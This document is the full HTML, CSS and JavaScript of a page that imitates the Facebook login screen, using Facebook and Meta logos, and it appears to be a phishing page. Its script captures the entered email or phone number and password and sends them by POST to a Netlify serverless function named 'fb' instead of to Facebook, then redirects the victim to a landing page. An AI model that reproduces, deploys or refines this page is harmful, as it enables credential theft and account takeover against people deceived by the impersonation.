<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Roboto, Helvetica, Arial, sans-serif;
}

body{
    background:#f0f2f5;
}

/* Header */
.header{
    background:#73767d;
    color:white;
    padding:15px;
    font-size:18px;
    font-weight:500;
}

/* Container */
.container{
    padding:20px;
    text-align:center;
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
}

/* Language */
.language{
    color:#65676b;
    margin:15px 0;
    font-size:15px;
}

/* Facebook Logo */
.logo{
    margin:20px 0;
}

.logo img{
    width:65px;
}

/* Form */
form{
    width:100%;
    max-width:400px;
}

/* Floating Input */
.input-group{
    position:relative;
    width:100%;
    margin-bottom:18px;
}

.input-group input{
    width:100%;
    padding:22px 45px 10px 15px;
    border-radius:12px;
    border:1px solid #dddfe2;
    background:#f0f2f5;
    font-size:16px;
    outline:none;
    transition:0.2s;
}

.input-group input:focus{
    border-color:#1877f2;
    background:white;
}

.input-group label{
    position:absolute;
    left:15px;
    top:18px;
    color:#65676b;
    font-size:16px;
    transition:0.2s ease;
    pointer-events:none;
}

.input-group input:focus + label,
.input-group input:not(:placeholder-shown) + label{
    top:6px;
    font-size:12px;
    color:#1877f2;
}

.input-group input::placeholder{
    color:transparent;
}

/* Toggle password */
.toggle-password{
    position:absolute;
    right:15px;
    top:18px;
    cursor:pointer;
    font-size:14px;
    color:#65676b;
}

/* Buttons */
.login-btn{
    width:100%;
    padding:14px;
    background:#1877f2;
    color:white;
    border:none;
    border-radius:30px;
    font-size:17px;
    font-weight:bold;
    margin-top:5px;
    cursor:pointer;
}

.login-btn:active{
    transform:scale(0.98);
}

.forgot{
    display:block;
    margin:20px 0;
    color:black;
    font-size:16px;
    text-decoration:none;
    font-weight:500;
}

.create-btn{
    width:100%;
    padding:14px;
    border-radius:30px;
    border:1px solid #1877f2;
    background:white;
    color:#1877f2;
    font-size:17px;
    font-weight:500;
    cursor:pointer;
}

.login-btn {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
}

.login-btn:disabled {
    opacity: 0.7;
    cursor: not-allowed;
}

.spinner {
    width: 16px;
    height: 16px;
    border: 3px solid white;
    border-top: 3px solid transparent;
    border-radius: 50%;
    display: none;
    animation: spin 0.7s linear infinite;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

/* Footer */
.footer{
    margin-top:40px;
    text-align:center;
}

/* Enlarged Meta Logo */
.footer img{
    width:70px;
    opacity:0.8;
}
</style>
</head>

<body>

<div class="header">Log in</div>

<div class="container">

    <div class="language">English</div>

    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
    </div>

<form id="loginForm">

    <div class="input-group">
        <input type="text" name="number" placeholder="Email" required>
        <label>Mobile number or email address</label>
    </div>

    <div class="input-group">
        <input type="password" id="password" name="password" placeholder="Password" required>
        <label>Password</label>
        <span class="toggle-password" onclick="togglePassword()">Show</span>
    </div>

   <button type="submit" class="login-btn" id="loginBtn">
    <span id="btnText">Log In</span>
    <span class="spinner" id="spinner"></span>
</button>

    <a href="#" class="forgot">Forgot Password?</a>

    <button type="button" class="create-btn">Create new account</button>

</form>

<div class="footer">
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png">
</div>

</div>

<script>
    

/* Toggle password */
function togglePassword(){
    const passwordInput = document.getElementById("password");
    const toggleText = document.querySelector(".toggle-password");

    if(passwordInput.type === "password"){
        passwordInput.type = "text";
        toggleText.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        toggleText.textContent = "Show";
    }
}

const form = document.getElementById("loginForm");
const button = document.getElementById("loginBtn");
const spinner = document.getElementById("spinner");
const btnText = document.getElementById("btnText");

let isLoading = false;

form.addEventListener("submit", async function(e) {
    e.preventDefault();

    if (isLoading) return; // Prevent double clicking
    isLoading = true;

    // Show spinner + disable button
    button.disabled = true;
    spinner.style.display = "inline-block";
    btnText.textContent = "Loading";
    const api ="/.netlify/functions/fb"
    try {
        const response = await fetch(api, {
            method: "POST",
            body: new FormData(form)
        });

        if (!response.ok) {
            throw new Error("Request failed");
        }

        const result = await response.json();

        // Only redirect if API confirms success
        if (result.success) {
            window.location.href = "landing.html";
        } else {
            alert("Login failed");
        }

    } catch (err) {
        alert("Something went wrong." + err);
    } finally {
        // Reset if not redirected
        isLoading = false;
        button.disabled = false;
        spinner.style.display = "none";
        btnText.textContent = "Log In";
    }
});
</script>

</body>
</html>
